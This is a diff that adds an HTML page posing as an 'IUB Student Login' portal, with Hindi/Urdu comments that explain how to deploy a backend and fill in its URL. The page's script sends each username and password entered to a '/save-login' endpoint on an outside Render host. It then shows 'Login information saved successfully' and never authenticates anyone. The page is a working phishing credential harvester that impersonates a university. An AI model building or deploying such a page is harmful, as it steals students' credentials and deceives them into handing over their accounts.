@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IUB Login Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a5f7a, #2d8bc0);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .login-box {
+            background: white;
+            width: 100%;
+            max-width: 400px;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #1a5f7a;
+        }
+        
+        h2 {
+            color: #1a5f7a;
+            margin-bottom: 5px;
+        }
+        
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: bold;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #2d8bc0;
+            box-shadow: 0 0 5px rgba(45, 139, 192, 0.3);
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #1a5f7a;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        
+        .login-btn:hover {
+            background: #14485c;
+        }
+        
+        .message {
+            padding: 12px;
+            border-radius: 5px;
+            margin-top: 15px;
+            display: none;
+            text-align: center;
+        }
+        
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a5f7a;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #666;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <div class="header">
+            <h2>IUB Student Login</h2>
+            <p class="subtitle">Enter your credentials to continue</p>
+        </div>
+        
+        <div id="message" class="message"></div>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label>Username or Email</label>
+                <input type="text" id="username" placeholder="Enter username or email" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" id="password" placeholder="Enter password" required>
+            </div>
+            
+            <button type="submit" class="login-btn" id="loginBtn">
+                <span id="btnText">Login</span>
+                <span id="btnLoading" class="loading" style="display:none;"></span>
+            </button>
+        </form>
+        
+        <div class="footer">
+            © 2024 IUB - All rights reserved
+        </div>
+    </div>
+
+    <script>
+        // ⬇️⬇️⬇️ STEP 1: Pehle Backend Deploy Karo Render.com Pe ⬇️⬇️⬇️
+        // ⬇️⬇️⬇️ STEP 2: Phir Yahaan Apna Render URL Daalo ⬇️⬇️⬇️
+        const BACKEND_URL = "https://YOUR-BACKEND-URL.onrender.com";
+        // Example: https://iub-backend.onrender.com
+        // Aapka URL: https://[service-name].onrender.com
+        
+        // Message dikhane ka function
+        function showMessage(text, type) {
+            const msg = document.getElementById('message');
+            msg.textContent = text;
+            msg.className = `message ${type}`;
+            msg.style.display = 'block';
+        }
+        
+        // Login form handle
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if(!username || !password) {
+                showMessage("Please fill all fields", "error");
+                return;
+            }
+            
+            // Loading show karo
+            document.getElementById('btnText').style.display = 'none';
+            document.getElementById('btnLoading').style.display = 'inline-block';
+            document.getElementById('loginBtn').disabled = true;
+            
+            try {
+                // Data backend pe bhejo
+                const response = await fetch(`${BACKEND_URL}/save-login`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        username: username,
+                        password: password,
+                        timestamp: new Date().toISOString(),
+                        ip: "User's IP",
+                        browser: navigator.userAgent
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if(result.success) {
+                    // Success message
+                    showMessage("✅ Login information saved successfully!", "success");
+                    
+                    // Form reset karo
+                    document.getElementById('loginForm').reset();
+                    
+                } else {
+                    showMessage("❌ Error saving data", "error");
+                }
+                
+            } catch (error) {
+                console.error("Error:", error);
+                showMessage("🌐 Cannot connect to server. Backend not deployed?", "error");
+            } finally {
+                // Loading hide karo
+                document.getElementById('btnText').style.display = 'inline';
+                document.getElementById('btnLoading').style.display = 'none';
+                document.getElementById('loginBtn').disabled = false;
+            }
+        });
+        
+        // Page load pe check karo backend status
+        window.addEventListener('load', async () => {
+            try {
+                const response = await fetch(`${BACKEND_URL}/test`);
+                if(response.ok) {
+                    console.log("✅ Backend connected");
+                }
+            } catch {
+                console.log("❌ Backend not connected");
+                showMessage("if result not appear wait for 30 mins", );
+            }
+        });
+    </script>
+</body>
+</html>
